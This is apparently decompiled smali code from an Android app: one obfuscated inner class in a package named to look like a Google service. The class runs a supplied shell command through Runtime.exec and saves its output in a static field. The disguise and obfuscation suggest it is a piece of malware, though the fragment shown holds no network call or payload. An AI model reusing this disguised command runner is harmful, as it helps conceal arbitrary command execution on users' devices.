.class final Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774$1;
.super Ljava/lang/Object;
.source "\u4240\u03c6\u20ab\u05d9\u2db1\u02c9\u02c8\u02cb\u03c6\u02be\ufe73$\u02c9\u3164\u1d62$\u02cb\u02bf\u02be$\u1d54\u4240\u02bf$\u05d9\u02bf\u3164$$\u1d35\u02cb4774.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->ec(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# instance fields
.field final synthetic val$c:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;)V
    .locals 0

    .line 483
    iput-object p1, p0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774$1;->val$c:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const-string v0, ""

    .line 485
    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    .line 488
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    iget-object v3, p0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774$1;->val$c:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 489
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1a

    if-lt v3, v4, :cond_0

    const-wide/16 v3, 0x3c

    .line 490
    sget-object v5, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v2, v3, v4, v5}, Ljava/lang/Process;->waitFor(JLjava/util/concurrent/TimeUnit;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 491
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V

    goto :goto_0

    .line 494
    :cond_0
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    .line 496
    :cond_1
    :goto_0
    new-instance v3, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/InputStreamReader;

    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 498
    :goto_1
    invoke-virtual {v3}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_2

    .line 499
    invoke-virtual {v1, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    goto :goto_1

    .line 502
    :cond_2
    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-virtual {v4}, Ljava/io/InputStream;->close()V

    .line 503
    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    .line 504
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 506
    :catch_0
    sput-object v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->dt:Ljava/lang/String;

    .line 508
    :goto_2
    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v1

    .line 509
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-nez v2, :cond_3

    .line 510
    sput-object v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->dt:Ljava/lang/String;

    .line 512
    :cond_3
    sput-object v1, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->dt:Ljava/lang/String;

    return-void
.end method
